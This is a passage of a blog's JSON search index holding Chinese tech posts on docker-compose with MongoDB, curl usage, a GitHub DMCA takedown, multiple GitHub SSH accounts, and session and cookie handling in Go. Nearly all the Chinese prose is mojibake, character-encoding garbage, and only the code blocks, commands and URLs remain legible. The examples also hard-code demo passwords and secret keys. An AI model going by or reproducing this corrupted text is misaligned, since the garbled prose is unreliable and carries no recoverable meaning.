/usr/local/bin/docker-compose \n\n\nsudo chmod +x /usr/local/bin/docker-compose \n\ndocker-compose --version\n```\n\n\n\n### 2. ä½¿ç”¨\n\n```bash\ndocker-compose up # å¯åŠ¨\ndocker-compose down # å…³é—­\n```\n\n> docker-compose.yml\n\n```yml\nversion: '3' # å®šä¹‰ç‰ˆæœ¬ï¼Œä¸æŒ‡å®šé»˜è®¤ä¸ºç‰ˆæœ¬ 1ï¼Œæ–°ç‰ˆæœ¬åŠŸèƒ½æ›´å¤š\n\n\nservices:\n\n  mongo4:\n    image: mongo:4\n    privileged: true\n    restart: unless-stopped\n    volumes:  \n      - $HOME/transcode/data/db/:/data/db/\n      - ./mongo/mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro\n    container_name: mongo4\n    environment:\n      MONGO_INITDB_ROOT_USERNAME: yx1\n      MONGO_INITDB_ROOT_PASSWORD: test\n      MONGO_INITDB_DATABASE: transcode_v1\n    network_mode: bridge # åŠ ä¸Šä¸ä¼šåˆ›å»ºé»˜è®¤çš„æ¡¥, å³æœ‰ä¸€ä¸ªä¸ºç©º, å°±ä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤ network\n    ports: # æš´éœ²ç«¯å£ä¿¡æ¯\n      - \"47047:27017\"\n\n\n\n  transcode-service:\n    build: service # æŒ‡å®š Dockerfile æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„\n    privileged: true # å…è®¸å®¹å™¨ä¸­è¿è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤\n    restart: unless-stopped\n    volumes:\n     - /var/lib/oceans/:/var/lib/oceans/\n    container_name: transcode-service\n    network_mode: host\n\n\n  transcode-webapi:\n    build: webapi\n    privileged: true\n    restart: unless-stopped\n    container_name: transcode-webapi\n    network_mode: host\n```\n\n\n\nç„¶ååœ¨ webapi, service æ–‡ä»¶å¤¹å†…åˆ›å»ºå„è‡ªçš„ dockerfile æ–‡ä»¶\n\n\n\n\n> ./mongo/mongo-init.js\n\n```javascript\ndb.createUser(\n    {\n        user: \"yx1\",\n        pwd: \"test\",\n        roles:[\n            {\n                role: \"readWrite\",\n                db:   \"transcode_v1\"\n            }\n        ]\n    }\n);\n```\n\n\n\n##### 2.1 é»˜è®¤ç½‘æ¡¥é—®é¢˜\n\ndocker-compose å¯åŠ¨åä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªç½‘æ¡¥, å¦‚æœä¸æƒ³åˆ›å»º, å³æ¯ä¸ªå®¹å™¨éƒ½å†™ä¸Šå€¼, ä¸èƒ½ä¸ºç©º\n\n```yaml\nnetwork_mode: bridge\n```\n\nå‚è€ƒ: https://stackoverflow.com/a/43755216\n\n\n\n##### 2.2 mongo å¯åŠ¨åè‡ªåŠ¨åˆ›å»ºç”¨æˆ·\n\nå‚è€ƒ: https://stackoverflow.com/a/54064268\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://yeasy.gitbooks.io/docker_practice/compose/\n+ https://juejin.im/post/5d17442e518825559f46ed92","tags":["docker-compose"],"categories":["docker"]},{"title":"curlå‘½ä»¤çš„ä½¿ç”¨æ€»ç»“","url":"%2Fp%2Fda64728.html","content":"\n[curl](http://curl.haxx.se/)æ˜¯ä¸€ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œä½œç”¨æ˜¯å‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œç„¶åå¾—åˆ°å’Œæå–æ•°æ®ï¼Œæ˜¾ç¤ºåœ¨\"æ ‡å‡†è¾“å‡º\"ï¼ˆstdoutï¼‰ä¸Šé¢ã€‚\n\n### 1. ä½¿ç”¨æ•™ç¨‹\n\n##### 1.1 æŸ¥çœ‹ç½‘é¡µæºç å’Œä¿å­˜\n\n```bash\ncurl www.sina.com\n```\n\nå¦‚æœè¦æŠŠè¿™ä¸ªç½‘é¡µä¿å­˜ä¸‹æ¥ï¼Œå¯ä»¥ä½¿ç”¨`-o`å‚æ•°ï¼Œè¿™å°±ç›¸å½“äºä½¿ç”¨wgetå‘½ä»¤äº†ã€‚\n\n```bash\ncurl -o [æ–‡ä»¶å] www.sina.com\n```\n\n<!-- more -->\n\n##### 1.2 æ˜¾ç¤ºå“åº”å¤´ä¿¡æ¯\n\n`-i`å‚æ•°å¯ä»¥æ˜¾ç¤ºhttp responseçš„å¤´ä¿¡æ¯ï¼Œè¿åŒç½‘é¡µä»£ç ä¸€èµ·ã€‚`-I`å‚æ•°åˆ™æ˜¯åªæ˜¾ç¤ºhttp responseçš„å¤´ä¿¡æ¯ã€‚\n\n```bash\ncurl -i www.sina.com\n```\n\n\n\n##### 1.3 æ˜¾ç¤ºé€šä¿¡è¿‡ç¨‹\n\n`-v`å‚æ•°å¯ä»¥æ˜¾ç¤ºä¸€æ¬¡httpé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼ŒåŒ…æ‹¬ç«¯å£è¿æ¥å’Œhttp requestå¤´ä¿¡æ¯ã€‚\n\n```bash\ncurl -v www.sina.com\n```\n\nå¦‚æœä½ è§‰å¾—ä¸Šé¢çš„ä¿¡æ¯è¿˜ä¸å¤Ÿï¼Œé‚£ä¹ˆä¸‹é¢çš„å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ›´è¯¦ç»†çš„é€šä¿¡è¿‡ç¨‹ã€‚\n\n```bash\ncurl --trace output.txt www.sina.com\ncurl --trace-ascii output.txt www.sina.com\n```\n\nè¿è¡Œåï¼Œè¯·æ‰“å¼€output.txtæ–‡ä»¶æŸ¥çœ‹ã€‚\n\n\n\n### 2. å‘é€æ•°æ®\n\n##### 2.1 å‘é€GET\n\nGETæ–¹æ³•ç›¸å¯¹ç®€å•ï¼Œåªè¦æŠŠæ•°æ®é™„åœ¨ç½‘å€åé¢å°±è¡Œã€‚\n\n```bash\ncurl example.com/form.cgi?data=xxx\n```\n\n\n\n##### 2.2 å‘é€POST\n\nPOSTæ–¹æ³•å¿…é¡»æŠŠæ•°æ®å’Œç½‘å€åˆ†å¼€ï¼Œcurlå°±è¦ç”¨åˆ°--dataå‚æ•°ã€‚\n\n```bash\ncurl -X POST --data \"data=xxx\" example.com/form.cgi\n```\n\nå¦‚æœä½ çš„æ•°æ®æ²¡æœ‰ç»è¿‡è¡¨å•ç¼–ç ï¼Œè¿˜å¯ä»¥è®©curlä¸ºä½ ç¼–ç ï¼Œå‚æ•°æ˜¯`--data-urlencode`ã€‚\n\n```bash\ncurl -X POST --data-urlencode \"date=April 1\" example.com/form.cgi\n\n# å¦‚æœç¼–ç å‰æœ‰=å·, éœ€è¦æå‰ç¼–ç \n--data-urlencode  'value=-vf scale=-2:360'   # é”™è¯¯\n--data-urlencode  'value=-vf scale%3d-2:360' # æ­£ç¡®\n```\n\n\n\n##### 2.3 HTTPåŠ¨è¯\n\ncurlé»˜è®¤çš„HTTPåŠ¨è¯æ˜¯GETï¼Œä½¿ç”¨`-X`å‚æ•°å¯ä»¥æ”¯æŒå…¶ä»–åŠ¨è¯ã€‚\n\n```bash\ncurl -X DELETE www.example.com\n```\n\n\n\n##### 2.4 å¢åŠ å¤´ä¿¡æ¯\n\næœ‰æ—¶éœ€è¦åœ¨http requestä¹‹ä¸­ï¼Œè‡ªè¡Œå¢åŠ ä¸€ä¸ªå¤´ä¿¡æ¯ã€‚`--header` æˆ– `-H `å‚æ•°å°±å¯ä»¥èµ·åˆ°è¿™ä¸ªä½œç”¨ã€‚\n\n```bash\ncurl --header \"Content-Type:application/json\" http://example.com\n```\n\n\n\n##### 2.5 HTTPè®¤è¯\n\næœ‰äº›ç½‘åŸŸéœ€è¦HTTPè®¤è¯ï¼Œè¿™æ—¶curléœ€è¦ç”¨åˆ°`--user`å‚æ•°ã€‚\n\n```bash\ncurl --user name:password example.com\n```\n\n\n\n##### 2.6 cookie\n\nä½¿ç”¨`--cookie`å‚æ•°ï¼Œå¯ä»¥è®©curlå‘é€cookieã€‚\n\n```bash\ncurl --cookie \"name=xxx\" www.example.com\n```\n\nè‡³äºå…·ä½“çš„cookieçš„å€¼ï¼Œå¯ä»¥ä»http responseå¤´ä¿¡æ¯çš„`Set-Cookie`å­—æ®µä¸­å¾—åˆ°ã€‚\n\n\n\n`-c cookie-file`å¯ä»¥ä¿å­˜æœåŠ¡å™¨è¿”å›çš„cookieåˆ°æ–‡ä»¶ï¼Œ`-b cookie-file`å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ä½œä¸ºcookieä¿¡æ¯ï¼Œè¿›è¡Œåç»­çš„è¯·æ±‚ã€‚\n\n```bash\ncurl -c cookies http://example.com\ncurl -b cookies http://example.com\n```\n\n\n\n##### 2.7 User Agentå­—æ®µ\n\nè¿™ä¸ªå­—æ®µæ˜¯ç”¨æ¥è¡¨ç¤ºå®¢æˆ·ç«¯çš„è®¾å¤‡ä¿¡æ¯ã€‚æœåŠ¡å™¨æœ‰æ—¶ä¼šæ ¹æ®è¿™ä¸ªå­—æ®µï¼Œé’ˆå¯¹ä¸åŒè®¾å¤‡ï¼Œè¿”å›ä¸åŒæ ¼å¼çš„ç½‘é¡µï¼Œæ¯”å¦‚æ‰‹æœºç‰ˆå’Œæ¡Œé¢ç‰ˆã€‚\n\n```bash\ncurl --user-agent \"[User Agent]\" [URL]\n```\n\n\n\n##### 2.8 Refererå­—æ®µ\n\næœ‰æ—¶ä½ éœ€è¦åœ¨http requestå¤´ä¿¡æ¯ä¸­ï¼Œæä¾›ä¸€ä¸ªrefererå­—æ®µï¼Œè¡¨ç¤ºä½ æ˜¯ä»å“ªé‡Œè·³è½¬è¿‡æ¥çš„ã€‚\n\n```bash\ncurl --referer http://www.example.com http://www.example.com\n```\n\n\n\n##### 2.9 æ–‡ä»¶ä¸Šä¼ \n\nå‡å®šæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•æ˜¯ä¸‹é¢è¿™æ ·ï¼š\n\n```html\n<form method=\"POST\" enctype='multipart/form-data' action=\"upload.cgi\">\nã€€ã€€ã€€ã€€<input type=file name=upload>\nã€€ã€€ã€€ã€€<input type=submit name=press value=\"OK\">\nã€€ã€€</form>\n```\n\nä½ å¯ä»¥ç”¨curlè¿™æ ·ä¸Šä¼ æ–‡ä»¶ï¼š\n\n```bash\ncurl --form upload=@localfilename --form press=OK [URL]\n```\n\n\n\n##### 2.10 ç»ˆæå‘½ä»¤\n\n```bash\ncurl --help\n```\n\n","tags":["curl"],"categories":["å‘½ä»¤"]},{"title":"è¿‘æœŸåšå®¢çš„æŠ˜è…¾å‘½è¿","url":"%2Fp%2F1dd7dc05.html","content":"\n\n\n### 1. github DMCA takedown\n\nå‰ä¸¤å¤©, å‘ç°blogçªç„¶æ— æ³•æäº¤äº†. å»é‚®ç®±é‡Œçœ‹githubå‘çš„é‚®ä»¶æ‰çŸ¥é“æœ‰ä¸€ç¯‡åšæ–‡æ¶‰åŠåˆ°jetbrainsç‰ˆæƒé—®é¢˜, è®©24å°æ—¶å†…å¤„ç†, åæ¥å®Œç¾é”™è¿‡äº†æ—¶é—´. å°±ç›´æ¥è¢«takedownäº†.\n\n\n\n### 2. æŠ˜è…¾è¿‡ç¨‹\n\ntakedownåä¸€è„¸æ‡µé€¼, åœ¨ç½‘ä¸ŠæŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆåŸºæœ¬éƒ½æ˜¯ç»™githubå‘é‚®ä»¶, è¯·æ±‚åˆ é™¤ä»“åº“æˆ–è€…å†ç»™ä¸€æ¬¡å®½é™24å°æ—¶çš„å¤„ç†æ—¶é—´. \n\näºæ˜¯æˆ‘è¯•ç€å‘äº†ä¸€å°é‚®ä»¶, æ²¡æƒ³åˆ°10å¤©åæ‰å¾—åˆ°å›å¤ (è¿™æ•ˆç‡~~~). å›å¤çš„æ—¶é—´è¿˜åœ¨åä¸€å‡æœŸå†…, è™½ç„¶åˆç»™æˆ‘äº†24å°æ—¶å¤„ç†, åˆè¢«æˆ‘å®Œç¾é”™è¿‡äº†.(!!!!!ä¸€å®šè¦å®šæœŸæŸ¥çœ‹é‚®ä»¶)\n\n<!-- more -->\n\näºæ˜¯åˆæƒ³åˆ°äº†ä»¥ä¸‹ä¸‰ä¸ªè§£å†³æ–¹æ¡ˆ:\n\n+ å‘é‚®ä»¶è®© github ç›´æ¥åˆ é™¤ä»“åº“(å› ä¸ºæ˜¯blog, æœ¬åœ°æœ‰å¤‡ä»½), ç„¶åå†é‡æ–°å»ºåº“.\n+ éƒ¨ç½²åˆ°å…¶ä»–å¹³å° (å¦‚ coding æˆ– è‡ªå·±çš„æœåŠ¡å™¨ä¸Š)\n+ éƒ¨ç½²åˆ°å°å·çš„ github ä¸Š\n\n\n\nä¸ºäº†çœäº‹, æˆ‘æœ€åçš„è§£å†³æ–¹æ¡ˆæ˜¯:\n\n1. å…ˆå‘é€githubç»™äºˆåˆ é™¤ä»“åº“çš„é‚®ä»¶(æˆªè‡³åˆ°å†™blogçš„æ—¶é—´, è¿˜æ²¡æœ‰å¾—åˆ°å›å¤) \n\n2. ç„¶ååœ¨å°å·çš„githubä¸Šåˆ›å»ºäº†ä»“åº“. ç„¶åæŠŠæœ¬åœ°blogæäº¤ä¸Šå». é‡æ–°æŠŠåŸŸåç»‘å®šgithub pageå³å¯.\n\n   \n\n   \n\n> ä¸ºä»€ä¹ˆè¯´æŠ˜è…¾å‘¢!!!!!!  \n\n\n\nåœ¨å°å·ç»‘å®šCNAMEæ—¶, æç¤ºåŸŸåCNAMEè¢«å ç”¨, è¦å…ˆåˆ é™¤ä¹‹å‰çš„åŸŸåç»‘å®š, å› ä¸ºä¹‹å‰çš„ä»“åº“è¢«takedownäº†æ— æ³•ç¼–è¾‘åˆ é™¤, å°å·ä»“åº“å°±æ— æ³•æ·»åŠ .  çœŸçš„æ˜¯æ— fuckè¯´\n\n\n\nåæ¥å°å·åˆå‘äº†ä¸€å°é‚®ä»¶è¯´CNAMEè¢«å ç”¨, å›å¤è®©æˆ‘åœ¨åŸŸåè§£æé‡ŒåŠ ä¸€æ¡TXTè®°å½•, ç…§åšå, å‡ å¤©åå°±å¯ä»¥äº†.\n\n\n\n### 3. äº‹ä»¶æ•™è®­\n\n+ ä¸€æ ·è¦æé«˜ç‰ˆæƒæ„è¯†.\n\n+ å®šæœŸæŸ¥çœ‹é‚®ä»¶, å®šæœŸæŸ¥çœ‹é‚®ä»¶, å®šæœŸæŸ¥çœ‹é‚®ä»¶","categories":["åšå®¢"]},{"title":"githubå¤šå¸å·ç™»å½•çš„é—®é¢˜","url":"%2Fp%2F899d7696.html","content":"\n\n\n### 1. åŒä¸€å°ç”µè„‘æœ‰2ä¸ªgithubè´¦å·ï¼Ÿ\n\n+ é¦–å…ˆè¦ä¸ºæ¯ä¸ªå¸å·ç”Ÿæˆå…¬é’¥ç§é’¥å¯¹, å¹¶ä¸”è®¾ç½®åˆ° github é‡Œ, å‚è€ƒ {% post_link 2-linuxç³»ç»Ÿ/git/githubå’Œgiteeé€šè¿‡å¯†é’¥æ¥è¿›è¡Œsshè¿æ¥ %}\n\n+ ä¿®æ”¹ `~/.ssh/config`, è®¾ç½®å¦‚ä¸‹\n\n```bash\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\næµ‹è¯•:\n```bash\nssh -T git@unix2dos\nssh -T git@levonfly\n```\n<!-- more -->\n\n+ è¦ä¿®æ”¹ä»“åº“çš„ remote url, å¯¹åº” `~/.ssh/config` æ‰€å¡«å†™çš„å€¼.  æ³¨æ„, è¦ä¿®æ”¹ git@åé¢çš„è¿™ä¸ªå€¼\n\n```bash\ngit remote set-url origin git@unix2dos:unix2dos/LevonRecord.git\n```\n\n\n\n- ä¸€å®šè¦è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±.å¦åˆ™è™½ç„¶å¯ä»¥æäº¤ commit, ä½†æ˜¯ä¸è®¤è¯†ä½ æ˜¯è°\n\n  \n\n- å»ºè®® global ç”¨ä¸€ä¸ª,  å…¶ä»–é¡¹ç›®ç”¨å¦å¤–çš„ç”¨æˆ·å\n\n```bash\ngit config -l\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email \"levonfly@gmail.com\" \n\n\ngit config user.name \"levonfly\"\ngit config user.email \"6241425@qq.com\" \n```\n\n\n\n### 2. macåˆ‡æ¢ç”¨æˆ·æäº¤å¤±è´¥çš„é—®é¢˜\n\næäº¤æ€»æ˜¯å‡ºç°permission deniedçš„é—®é¢˜ï¼Œç”¨git config --globalæ›´æ–°äº†usernameå’Œemailä¹Ÿä¸è¡Œã€‚\n\nmac osåŸå› æ˜¯å³ä¾¿æ›´æ–°äº†usernameå’Œemailï¼Œmacåœ¨git pushæ—¶è¿˜æ˜¯ä¼šä½¿ç”¨å†å²è´¦å·çš„å¯†ç ã€‚\n\n> è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\n\n1. è¿›å…¥Keychain Access (ä¸çŸ¥é“åœ¨å“ªå„¿çš„å¯ä»¥command+spaceæŸ¥æ‰¾)\n2. åœ¨æœç´¢æ¡†è¾“å…¥'git'è¿›è¡ŒæŸ¥æ‰¾ï¼Œå°†æ‰¾åˆ°çš„æ–‡ä»¶åˆ æ‰ï¼Œè¿™é‡Œä¿å­˜äº†å†å²è´¦å·çš„ä¿¡æ¯\n3. åˆ é™¤ä¹‹åé‡æ–°ç”¨git config --globalæ›´æ–°usernameå’Œemailå³å¯ï¼Œä¹‹ågit pushä¼šè¦æ±‚ä½ è¾“å…¥usernameå’Œpassword\n4. done!\n\n\nå‚è€ƒ: https://www.zhihu.com/question/23028445/answer/399033488\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://gist.github.com/jexchan/2351996\n+ https://www.zhihu.com/question/23028445/answer/399033488","tags":["github"],"categories":["git"]},{"title":"sessionçš„ä»‹ç»å’Œgolangå®æˆ˜","url":"%2Fp%2F312a7a36.html","content":"\nSessionæ˜¯æœåŠ¡å™¨ç«¯ä½¿ç”¨çš„ä¸€ç§è®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ï¼ŒSessionåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºã€‚å®¢æˆ·ç«¯åªä¿å­˜sessionidåˆ°cookieä¸­ï¼Œè€Œä¸ä¼šä¿å­˜sessionï¼Œå…³æ‰æµè§ˆå™¨å¹¶ä¸ä¼šå…³é—­sessionã€‚\n\n<!-- more -->\n\n# 1. session ä»‹ç»\n\n### 1.1 sessionä¸cookieçš„åŒºåˆ«\n\ncookieä¸sessionæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯å°†æ•°æ®å­˜æ”¾åœ¨å®¢æˆ·ç«¯ï¼Œä¸€ä¸ªæ˜¯å°†æ•°æ®å­˜æ”¾åœ¨æœåŠ¡ç«¯ã€‚\n\nsessioné€šä¿¡çš„ä¸€èˆ¬å®ç°å½¢å¼æ˜¯é€šè¿‡cookieæ¥å®ç°ï¼Œä¸cookieä¸åŒçš„æ˜¯ï¼Œsessionåªä¼šä¿å­˜ä¸€ä¸ªsessionIDåœ¨å®¢æˆ·ç«¯ï¼Œä¸ä¼šåƒcookieé‚£æ ·å°†å…·ä½“çš„æ•°æ®ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œsessionå…·ä½“çš„æ•°æ®åªä¼šä¿å­˜åœ¨æœåŠ¡ç«¯ä¸Šã€‚\n\n### 1.2 sessionæµç¨‹\n\nSessionæœ‰ä¸¤ä¸ªä¸»è¦çš„ä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯SessionIDï¼Œä¸€ä¸ªæ˜¯å­˜æ”¾åœ¨æœåŠ¡ç«¯å¯¹è±¡æ± ä¸­çš„Sessionå¯¹è±¡ã€‚\n\nå®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­è¿™ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ®ä¸­æ˜¯å¦åŒ…å«æœ‰SessionIDï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå°±ä¼šè®¤ä¸ºè¿™ä¸ªå®¢æˆ·ç«¯æ˜¯ç¬¬ä¸€æ¬¡è¿›è¡Œè®¿é—®ã€‚\n\nå› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œæ‰€ä»¥æœåŠ¡ç«¯ä¼šç»™å®¢æˆ·ç«¯åœ¨å¯¹è±¡æ± ä¸­åˆ›å»ºä¸€ä¸ªSessionå¯¹è±¡ï¼ˆå‡è®¾è¿™ä¸ªä¼šè¯æ˜¯éœ€è¦ç»´æŒçš„ï¼‰ï¼Œå¹¶ç”Ÿæˆå‡ºè¿™ä¸ªå¯¹è±¡çš„SessionIDï¼Œæ¥ç€ä¼šé€šè¿‡cookieå°†SessionIDå“åº”ç»™å®¢æˆ·ç«¯ï¼ŒåŒæ—¶ä¼šæŠŠSessionå¯¹è±¡æ”¾å›å¯¹è±¡æ± é‡Œã€‚\n\nå®¢æˆ·ç«¯æ¥æ”¶å“åº”æ•°æ®åä¼šå°†SessionIDå­˜æ”¾åœ¨æœ¬åœ°ï¼Œä¸‹ä¸€æ¬¡å†è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™å°±ä¼šæŠŠSessionIDç»™å¸¦ä¸Šï¼ŒæœåŠ¡ç«¯å°±èƒ½å¤Ÿé€šè¿‡SessionIDè·å¾—ç›¸åº”çš„Sessionå¯¹è±¡ï¼ŒSessionå°±æ˜¯ä»¥è¿™æ ·çš„ä¸€ä¸ªæœºåˆ¶ç»´æŒä¼šè¯çŠ¶æ€çš„ã€‚\n\n### 1.3 sessionå­˜å‚¨\n\nsessionæ•°æ®å­˜å‚¨åˆ°å†…å­˜æ˜¯æœ€ä½³çš„é€‰æ‹©ã€‚æœ€å¥½çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨åˆ†å¸ƒå¼ç¼“å­˜æŠ€æœ¯ï¼Œä¾‹å¦‚ï¼šmemcachedå’Œredisï¼Œå°†sessionä¿¡æ¯çš„å­˜å‚¨ç‹¬ç«‹å‡ºæ¥ä¹Ÿæ˜¯è§£å†³ session åŒæ­¥é—®é¢˜çš„æ–¹æ³•ã€‚\n\n\n\n### 1.4 sessionåŠ«æŒé˜²èŒƒ\n\nå…¶ä¸­ä¸€ä¸ªè§£å†³æ–¹æ¡ˆå°±æ˜¯sessionIDçš„å€¼åªå…è®¸cookieè®¾ç½®ï¼ŒåŒæ—¶è®¾ç½®cookieçš„httponlyä¸ºtrueï¼Œè¿™ä¸ªå±æ€§æ˜¯è®¾ç½®æ˜¯å¦å¯é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬è®¿é—®è¿™ä¸ªè®¾ç½®çš„cookieã€‚ç¬¬ä¸€å¯ä»¥é˜²æ­¢è¿™ä¸ªcookieè¢«XSSè¯»å–ä»è€Œå¼•èµ·sessionåŠ«æŒï¼Œç¬¬äºŒcookieè®¾ç½®ä¸ä¼šåƒURLé‡ç½®æ–¹å¼é‚£ä¹ˆå®¹æ˜“è·å–sessionIDã€‚\n\n\n\nè¿˜æœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œæˆ‘ä»¬ç»™sessioné¢å¤–è®¾ç½®ä¸€ä¸ªåˆ›å»ºæ—¶é—´çš„å€¼ï¼Œä¸€æ—¦è¿‡äº†ä¸€å®šçš„æ—¶é—´ï¼Œæˆ‘ä»¬é”€æ¯è¿™ä¸ªsessionIDï¼Œé‡æ–°ç”Ÿæˆæ–°çš„sessionï¼Œè¿™æ ·å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢sessionåŠ«æŒçš„é—®é¢˜ã€‚\n\n\n\n# 2. golang ä½¿ç”¨ session\n\n+ https://github.com/gin-contrib/sessions\n\n```go\npackage main\n\nimport (\n\t\"github.com/gin-contrib/sessions\"\n\t\"github.com/gin-contrib/sessions/cookie\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tstore := cookie.NewStore([]byte(\"secret\"))\n\tr.Use(sessions.Sessions(\"mysession\", store))\n\n\tr.GET(\"/incr\", func(c *gin.Context) {\n\t\tsession := sessions.Default(c)\n\t\tvar count int\n\t\tv := session.Get(\"count\")\n\t\tif v == nil {\n\t\t\tcount = 0\n\t\t} else {\n\t\t\tcount = v.(int)\n\t\t\tcount++\n\t\t}\n\t\tsession.Set(\"count\", count)\n\t\tsession.Save()\n\t\tc.JSON(200, gin.H{\"count\": count})\n\t})\n\tr.Run(\":8000\")\n}\n```\n\n\n\n+ github.com/gorilla/sessions\n\n```go\n// sessions.go\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/sessions\"\n)\n\nvar (\n    // key must be 16, 24 or 32 bytes long (AES-128, AES-192 or AES-256)\n    key = []byte(\"super-secret-key\")\n    store = sessions.NewCookieStore(key)\n)\n\nfunc secret(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Check if user is authenticated\n    if auth, ok := session.Values[\"authenticated\"].(bool); !ok || !auth {\n        http.Error(w, \"Forbidden\", http.StatusForbidden)\n        return\n    }\n\n    // Print secret message\n    fmt.Fprintln(w, \"The cake is a lie!\")\n}\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Authentication goes here\n    // ...\n\n    // Set user as authenticated\n    session.Values[\"authenticated\"] = true\n    session.Save(r, w)\n}\n\nfunc logout(w http.ResponseWriter, r *http.Request) {\n    session, _ := store.Get(r, \"cookie-name\")\n\n    // Revoke users authentication\n    session.Values[\"authenticated\"] = false\n    session.Save(r, w)\n}\n\nfunc main() {\n    http.HandleFunc(\"/secret\", secret)\n    http.HandleFunc(\"/login\", login)\n    http.HandleFunc(\"/logout\", logout)\n\n    http.ListenAndServe(\":8080\", nil)\n}\n```\n\n\n\n```bash\n$ go run sessions.go\n\n$ curl -s http://localhost:8080/secret\nForbidden\n\n$ curl -s -I http://localhost:8080/login\nSet-Cookie: cookie-name=MTQ4NzE5Mz...\n\n$ curl -s --cookie \"cookie-name=MTQ4NzE5Mz...\" http://localhost:8080/secret\nThe cake is a lie!\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.iteye.com/blog/justsee-1570652\n+ https://gowebexamples.com/sessions/\n+ https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/06.0.md\n\n\n\n","tags":["session"],"categories":["web"]},{"title":"cookieçš„ä»‹ç»ä¸golangå®æˆ˜","url":"%2Fp%2F2a7234ed.html","content":"\nCookie æ˜¯åœ¨ HTTP åè®®ä¸‹ï¼Œç”± `Web æœåŠ¡å™¨`ä¿å­˜åœ¨ç”¨æˆ·æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šçš„å°æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒå¯ä»¥åŒ…å«æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ã€‚æ— è®ºä½•æ—¶ç”¨æˆ·é“¾æ¥åˆ°æœåŠ¡å™¨ï¼ŒWeb ç«™ç‚¹éƒ½å¯ä»¥è®¿é—® Cookie ä¿¡æ¯ã€‚\n\nCookieå®é™…ä¸Šæ˜¯ä¸€å°æ®µçš„æ–‡æœ¬ä¿¡æ¯ã€‚å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨éœ€è¦è®°å½•è¯¥ç”¨æˆ·çŠ¶æ€ï¼Œå°±ä½¿ç”¨responseå‘å®¢æˆ·ç«¯æµè§ˆå™¨é¢å‘ä¸€ä¸ªCookieã€‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šæŠŠCookieä¿å­˜èµ·æ¥ã€‚å½“æµè§ˆå™¨å†è¯·æ±‚è¯¥ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨æŠŠè¯·æ±‚çš„ç½‘å€è¿åŒè¯¥Cookieä¸€åŒæäº¤ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ£€æŸ¥è¯¥Cookieï¼Œä»¥æ­¤æ¥è¾¨è®¤ç”¨æˆ·çŠ¶æ€ã€‚æœåŠ¡å™¨è¿˜å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹Cookieçš„å†…å®¹ã€‚\n\n<!-- more -->\n\n# 1. cookie ä»‹ç»\n\nCookie æ˜¯æœåŠ¡å™¨**ä¿å­˜åœ¨æµè§ˆå™¨çš„**ä¸€å°æ®µæ–‡æœ¬ä¿¡æ¯ï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸€èˆ¬ä¸èƒ½è¶…è¿‡4KBã€‚æµè§ˆå™¨æ¯æ¬¡å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é™„ä¸Šè¿™æ®µä¿¡æ¯ã€‚\n\nCookie ä¸»è¦ç”¨æ¥åˆ†è¾¨ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€ä¸ªæµè§ˆå™¨ï¼Œä»¥åŠç”¨æ¥ä¿å­˜ä¸€äº›çŠ¶æ€ä¿¡æ¯ã€‚æœ‰äº›å¼€å‘è€…ä½¿ç”¨ Cookie 